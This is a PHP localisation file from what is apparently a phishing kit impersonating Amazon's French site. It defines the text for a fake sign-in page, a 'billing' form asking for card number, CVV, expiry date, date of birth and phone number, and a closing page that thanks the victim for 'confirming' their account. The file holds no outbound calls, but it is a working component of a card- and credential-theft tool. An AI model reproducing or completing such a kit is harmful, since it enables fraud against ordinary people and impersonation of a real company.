<?php
$m3il9a_1 = 'Prime';
$m3il9a_2 = 'Toutes nos catégories';
$m3il9a_3 = 'Sélectionnez le département que vous souhaitez rechercher';
$m3il9a_4 = 'FR';
$m3il9a_5 = 'Bonjour. Identifiez';
$m3il9a_6 = 'Votre compte';
$m3il9a_7 = 'Listes';
$m3il9a_8 = 'Panier';

$zab_a = 'Votre compte';
$zab_b = 'Portefeuille Amazon';
$zab_c = 'Amazon Manager';
$Azzouz1 = 'Amazon accepte toutes les principales cartes de crédit et de débit';
$Azzouz2 = 'Cartes de crédit ou de débit';
$Azzouz3 = 'Nom sur la carte';
$Azzouz4 = 'Adresse email';
$Azzouz5 = 'Mot de passe';
$Azzouz6 = 'Confirmer le mot de passe';
$Azzouz7 = 'Entrez votre adresse e-mail jointe';
$Azzouz8 = "Utilisez cette carte sur toute l'Amazonie";
$year = date('Y');
///////////////////////  Signin ///////////////////////////////////
$dexter_zkika_1 = "Identifiez-vous";
$dexter_zkika_2 = "Adresse e-mail ou numéro de téléphone portable";
$dexter_zkika_3 = "Mot de passe oublié?";
$dexter_zkika_4 = "Mot de passe";
$dexter_zkika_5 = "Identifiez-vous";
$dexter_zkika_6 = "Nouveau chez Amazon ?";
$dexter_zkika_11 = "En vous connectant, vous acceptez notre";	 
$dexter_zkika_111 = "Conditions d'utilisation et de vente";	
$dexter_zkika_1111 = "et notre";	
$dexter_zkika_11111 = "Avis de confidentialité";	
$dexter_zkika_12 = "Créer un compte";	 
$dexter_zkika_13 = "Conditions d'utilisation";	 
$dexter_zkika_15 = "Protection de vos informations personnelles";	
$dexter_zkika_16 = "Aide";
$goverment_is_bad_1 = "© 1996-$year, Amazon.com, Inc. ou ses filiales.";
$goverment_is_bad_2 = "Amazon - Connexion";
///////////////////////// billing ///////////////////////////////////
$richard_azzouz_1 = "Amazon - facturation ";
$richard_azzouz_2 = "Bonjour.";
$richard_azzouz_3 = "Search";
$richard_azzouz_4 = "Tous";
$richard_azzouz_5 = "Identifiez-vous";
$richard_azzouz_6 = "Panier";
$richard_azzouz_7 = "Souhait";
$richard_azzouz_8 = "liste";
$goverment_is_bad_4 = "Entrez vos informations de carte de crédit";
$goverment_is_bad_5 = "Lorsque vous avez terminé, cliquez sur le bouton Continuer.";
$goverment_is_bad_6 = "Nom de titulaire";
$goverment_is_bad_7 = "Numéro de carte";
$goverment_is_bad_8 = "Aucun des tirets ou des espaces";
$goverment_is_bad_09 = "Code de sécurité de la carte.";
$goverment_is_bad_10 = "Date d'expiration";
$goverment_is_bad_11 = "Mois";
$goverment_is_bad_12 = "Année";
$goverment_is_bad_13 = "Jour";
$goverment_is_bad_14 = "Numéro Téléphone";
$goverment_is_bad_15 = "Code Postal";
$goverment_is_bad_16 = "Date De Naissance";
$goverment_is_bad_17 = "CVV Code";
$goverment_is_bad_18 = "Continuer";
$goverment_is_bad_19 = "Conditions générales de vente";
$goverment_is_bad_20 = "Vos informations personnelles";
$goverment_is_bad_21 = "Cookies et Publicité sur Internet";
/////////////////////////// finich //////////////////////////////////////////////////
$zkika_logo     = "Amazon - Terminé";
$dexter_zkikab_1 = "Mérci !";
$dexter_zkikab_2 = "Vous avez confirmé avec succès <br> vos informations de compte";
$dexter_zkikab_3 = "Vous devez vous reconnecter pour enregistrer les modifications, vous serez redirigé vers la page de connexion en 5 secondes. Nous vous remercions d'utiliser notre vérification du système.";
//////////////////////////////////////////////////////////////////////////////////////


?>